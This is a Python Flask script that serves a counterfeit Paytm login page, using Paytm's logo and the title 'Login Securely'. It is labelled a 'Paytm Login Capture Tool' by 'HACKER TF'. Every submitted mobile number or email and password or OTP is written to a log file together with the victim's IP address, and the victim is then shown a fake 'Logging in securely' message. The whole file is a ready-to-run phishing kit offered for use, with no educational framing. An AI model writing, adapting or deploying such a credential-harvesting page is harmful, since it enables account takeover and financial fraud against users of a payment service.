from flask import Flask, request, render_template_string
import os

app = Flask(__name__)
SAVE_PATH = "/sdcard/HackerTF"
LOG_FILE = os.path.join(SAVE_PATH, "log.txt")
os.makedirs(SAVE_PATH, exist_ok=True)

html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Paytm - Login Securely</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f6f7fb; text-align: center; padding-top: 50px; }
        .box { background: white; padding: 30px; width: 320px; margin: auto; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        input, button { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #ccc; }
        button { background: #00baf2; color: white; font-weight: bold; border: none; cursor: pointer; }
        img { width: 100px; margin-bottom: 20px; }
        .footer { font-size: 12px; margin-top: 20px; color: #888; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://assetscdn1.paytm.com/images/catalog/view_item/728204/1617868908534.png">
        <h3>Login to Paytm</h3>
        <form method="POST" action="/login">
            <input type="text" name="mobile" placeholder="Enter Mobile Number or Email" required><br>
            <input type="password" name="password" placeholder="Enter OTP or Password" required><br>
            <button type="submit">Secure Login</button>
        </form>
    </div>
    <div class="footer">
        Made by HACKER TF
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(html_template)

@app.route('/login', methods=['POST'])
def login():
    mobile = request.form.get('mobile')
    password = request.form.get('password')
    ip = request.remote_addr

    log = f"""
[+] Paytm Login
IP: {ip}
Mobile/Email: {mobile}
OTP/Password: {password}
----------------------------
"""
    print(log)
    with open(LOG_FILE, "a") as f:
        f.write(log)

    return "<h3>Logging in securely...</h3>"

if __name__ == '__main__':
    os.system('clear' if os.name == 'posix' else 'cls')
    print("\033[1;36m" + "="*40)
    print("         Made by HACKER TF        ")
    print("       Paytm Login Capture Tool   ")
    print("="*40 + "\033[0m")
    print("Server running on: http://localhost:5000\n")
    app.run(host="0.0.0.0", port=5020)